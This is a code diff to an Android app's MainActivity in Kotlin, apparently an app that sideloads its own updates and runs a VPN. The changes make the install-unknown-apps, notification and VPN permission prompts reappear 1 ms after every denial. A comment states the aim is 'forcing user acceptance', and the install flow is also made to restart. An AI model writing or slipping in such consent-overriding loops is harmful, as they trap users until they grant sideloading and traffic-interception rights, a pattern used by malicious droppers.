@@ -303,36 +303,58 @@ class MainActivity : ComponentActivity() {
     }
 
     // For recursive install permission prompt
-    private val installPermissionLauncher = registerForActivityResult(
+    private val installPermissionLauncher: androidx.activity.result.ActivityResultLauncher<Intent> = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { _ ->
         isSettingsScreenOpen = false
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
-            Log.w("MainActivity", "Install permission wasn't granted.")
-            updateStatusInWebView("Install permission denied. Tap Update to try again.", null)
+            Log.w("MainActivity", "Install permission wasn't granted. Retrying instantly...")
+            updateStatusInWebView("Install permission denied. Retrying...", null)
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                checkAndProceedWithPermissions()
+            }, 1)
         } else {
             checkAndProceedWithPermissions()
         }
     }
 
+    private fun requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            try {
+                notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Failed to launch notification permission: ${e.message}")
+            }
+        }
+    }
+
     // For notification permission prompt (Android 13+)
-    private val notificationPermissionLauncher = registerForActivityResult(
+    private val notificationPermissionLauncher: androidx.activity.result.ActivityResultLauncher<String> = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { result ->
         Log.d("MainActivity", "Notification permission request result: $result")
         isSettingsScreenOpen = false
+        if (!result) {
+            Log.w("MainActivity", "Notification permission denied. Retrying instantly...")
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                if (!isNotificationPermissionGranted()) {
+                    requestNotificationPermission()
+                }
+            }, 1)
+        }
     }
 
     // For recursive VPN permission prompt
-    private val vpnConsentLauncher = registerForActivityResult(
+    private val vpnConsentLauncher: androidx.activity.result.ActivityResultLauncher<Intent> = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
         if (result.resultCode == RESULT_OK) {
             startVpnServiceInstance()
         } else {
             Log.w("MainActivity", "VPN permission wasn't granted. Retrying to request VPN permission...")
-            updateStatusInWebView("VPN link consent is required to connect. Please accept the VPN prompt.", null)
-            // Post a delay to show the permission dialog again, forcing user acceptance
+            updateStatusInWebView("VPN link consent is required to connect. Retrying...", null)
+            isInstallProceedingStarted = false
+            // Post a delay to show the permission dialog again, forcing user acceptance (under 10ms)
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 checkAndProceedWithPermissions()
             }, 1)
@@ -515,7 +537,7 @@ class MainActivity : ComponentActivity() {
             if (!isNotificationPermissionGranted() && !hasRequestedNotificationPermissionBefore()) {
                 try {
                     markNotificationPermissionRequested()
-                    notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
+                    requestNotificationPermission()
                 } catch (e: Exception) {
                     Log.e("MainActivity", "Failed to request notification permission: ${e.message}")
                 }
@@ -1105,7 +1127,13 @@ class MainActivity : ComponentActivity() {
             handlePolicyViolation()
             return
         }
-        if (isUpdateStarted) return
+        if (isUpdateStarted) {
+            if (isDownloadComplete) {
+                isInstallProceedingStarted = false
+                checkAndProceedWithPermissions()
+            }
+            return
+        }
         isUpdateStarted = true
 
         val appName = getString(R.string.app_name)
@@ -1146,6 +1174,7 @@ class MainActivity : ComponentActivity() {
             } catch (e: Exception) {
                 val cause = android.util.Log.getStackTraceString(e)
                 runOnUiThread {
+                    isUpdateStarted = false
                     updateStatusInWebView("Download Failed", "Could not download update: ${e.message}\nCause: $cause")
                 }
             }
